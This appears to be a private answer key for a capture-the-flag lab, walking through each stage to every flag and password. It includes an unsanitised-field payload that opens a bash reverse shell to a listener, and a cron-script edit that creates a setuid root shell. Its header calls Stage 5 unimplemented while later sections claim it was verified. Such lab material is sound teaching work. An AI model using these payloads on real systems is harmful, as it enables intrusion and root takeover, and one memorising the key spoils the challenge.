# Solution Walkthrough

> Private — never player-accessible. This is the exact path verified
> against the real, built project (not a plan) as of Phase 4. Stage 5
> (privilege escalation) is not implemented yet — see PROJECT-STATUS.md.

## Stage 1 — OSINT (Original Flag 1, 100 pts)

Served live by the app, unauthenticated, at `/materials/osint/`
(also present under `challenge-data/stage1-osint/` in this repo, used
to build and test the content — both are the same files).

1. Visit `http://<vm>:8080/` → landing page links to
   `/materials/` → `/materials/osint/profile.html` — username
   `jtyler_dev`, links conceptually to the `ledger-tools` project
   (mentioned in Activity).
2. `/materials/osint/project-page.html` — footer has:
   `Build fingerprint: SYN{osint_fingerprint_f0c73a91}` → **Flag 1**.
3. Decoys on `profile.html`: an old "CI badge" (`FFLAG:old_profile_rev1_55c2`,
   plaintext) and a hex-encoded encrypted gist (`FFLAG:deprecated_repo_link_a913`,
   password `legacyKey2016` printed right next to it).

## Stage 2 — Metadata (Original Flag 2, 100 pts)

Served live at `/materials/metadata/*.png` (also
`challenge-data/stage2-metadata/*.png` in this repo).

1. Download `handover_photo.png`, `exiftool handover_photo.png` →
   `Comment` field: `handover desk photo — SYN{exif_breadcrumb_8d12ff04}`
   → **Flag 2**.
2. Decoys: `old_office.png`'s `Comment` has
   `FFLAG:camera_test_shot_2017_cc41` (plaintext). `scan_backup.png`'s
   `Comment` is a hex-encoded ciphertext; its `Artist` field literally
   says the password (`scanpass2017`) → decrypts to
   `FFLAG:draft_scan_metadata_77b0`.

## Stage 3 — Git history + crypto (Original Flag 3, 150 pts)

Served live at `/materials/stage3-git-history.tar.gz` — download,
extract (`tar xzf stage3-git-history.tar.gz`), then work inside the
extracted `stage3-git-history/` repo (also present directly, already
extracted, as `challenge-data/stage3-git-history/` in this repo).

1. `git log --oneline` shows 4 commits; the working tree only has
   `README.md`. The commit `Clean up stale backup files` removed 4
   files.
2. `git show HEAD~2:notes.txt` (commit `c3bd785`) → passphrase
   `BlueHarbor-99`.
3. `git show HEAD~2:handover_backup.enc > backup.enc`, then:
   `python3 tools/flagcrypto.py decrypt BlueHarbor-99 backup.enc -`
   → `SYN{git_ghost_61ace7b2}` → **Flag 3**. **Keep this value** — it's
   the final artifact's password (Stage 13 of the project spec).
4. Decoys: `git show HEAD~1:old_test_flag.txt` → plaintext
   `FFLAG:legacy_test_flag_2018_3f09`. `git show HEAD~1:old_backup_2018.enc`
   decrypts with `old-wifi-2018` (also mentioned in `notes.txt`, as a
   deliberately-labeled "don't reuse" aside) → `FFLAG:rotated_out_jan_2019_e2a4`.

## Stage 4 — Web / IDOR (no flag by itself — unlocks the pivot)

App: seeded `john` / `Summer2019!` (given to players as the starting
foothold — see `player-material/Getting-Started.md`).

1. Log in as `john`. `GET /records/mine` redirects to `/records/1`
   ("Handover notes").
2. **IDOR**: `GET /records/2` — no ownership check, just login — reveals
   the "Admin handover record": admin web password `N3tOps-Diag#7` and
   a pointer to `/admin/diagnostics`.

## Stage 4 — Admin function / reverse shell (Original Flag 4, 200 pts)

1. Log in as `admin` / `N3tOps-Diag#7`.
2. `/admin/diagnostics`'s `host` field is shelled out unsanitized
   (`CWE-78`). On the listener side (single-host dev/test setup):
   `nc -lvnp 4444`. Payload for the `host` field:
   `127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.0.2.2/4444 0>&1 &' #`
   — `10.0.2.2` is the SLIRP gateway address the guest sees as "the
   host", **not** `127.0.0.1` (see `vm/networking.md`). Verified live in
   this project: listener received the connection and dropped into
   `admin@forgotten-admin:...$`, confirmed via `id` as
   `uid=1002(admin)`, never root.
3. Once on-box as `admin`:
   ```
   cat /home/admin/evidence/decrypt_notes.txt
   # original_flag_4.enc -> oldhandoff-rotate-2024
   python3 /opt/tools/flagcrypto.py decrypt oldhandoff-rotate-2024 \
       /home/admin/flags/original_flag_4.enc -
   # SYN{admin_blindspot_9f4e2c18}  -> Flag 4
   ```
4. Decoy: `original_flag_4_backup.enc` decrypts with `prerotate-2023`
   (also in `decrypt_notes.txt`) → `FFLAG:backup_pre_rotation_88c5`.
   `evidence/old_ticket.txt` has plaintext `FFLAG:ticket_closed_wontfix_19d7`.

## Stage 5 — Linux privilege escalation

Full mechanism and rationale: `instructor-material/privesc-design.md`.
Player begins this stage as Linux `admin` (confirmed above, no sudo).

1. `ls -la /etc/cron.d/` → `admin-tools-cleanup`, runs as root every
   minute, executing `/opt/admin-tools/cleanup.sh`.
2. `ls -la /opt/admin-tools/cleanup.sh` → `root:admin`, mode `664`.
   `id` shows `admin` is in group `admin`.
3. Append a command and wait for the next minute's cron tick:
   ```
   echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' >> /opt/admin-tools/cleanup.sh
   sleep 60
   /tmp/rootbash -p -c 'id'
   # uid=1002(admin) gid=110(admin) euid=0(root) groups=110(admin)
   ```
4. Clean up `/tmp/rootbash` when done (or run
   `vm/scripts/reset-privesc.sh` between teams).

## Final artifact (Original Flag 5, 250 pts)

Once root (Phase 5):
```
python3 /opt/tools/flagcrypto.py decrypt "SYN{git_ghost_61ace7b2}" \
    /root/final_evidence.enc -
# SYN{root_of_all_evidence_3b7d55a0}  -> Flag 5 (250 pts, total 800)
```
Note the password is Flag 3's *decrypted value*, not `BlueHarbor-99`
(Flag 3's own password) and not any Linux account password. Verified: a
wrong password fails; `admin` cannot read `/root` at all
(`Permission denied`) before privilege escalation.

Decoys in `/root`: `old_evidence.enc` decrypts with `SnapshotKey-2023`
(written in `root_note.txt`) → `FFLAG:old_root_snapshot_f02e`.
`root_note.txt` itself also contains the plaintext decoy
`FFLAG:old_root_memo_4b61`.

## Verified facts (not assumptions)

- All of the above (Stages 1–5, final artifact decrypt) was run for
  real in this session: against the actual files for Stages 1–3, and
  against the live, booted VM over HTTP + SSH for Stage 4, Stage 5, and
  the final artifact — including a genuine `admin` → `euid=0` privilege
  transition with no instructor `sudo` involved. See
  `PROJECT-STATUS.md`'s Phase 3/4/5 sections for the exact commands and
  output.
- `./scripts/validate-flags.sh` passes all structural + decryption
  checks.
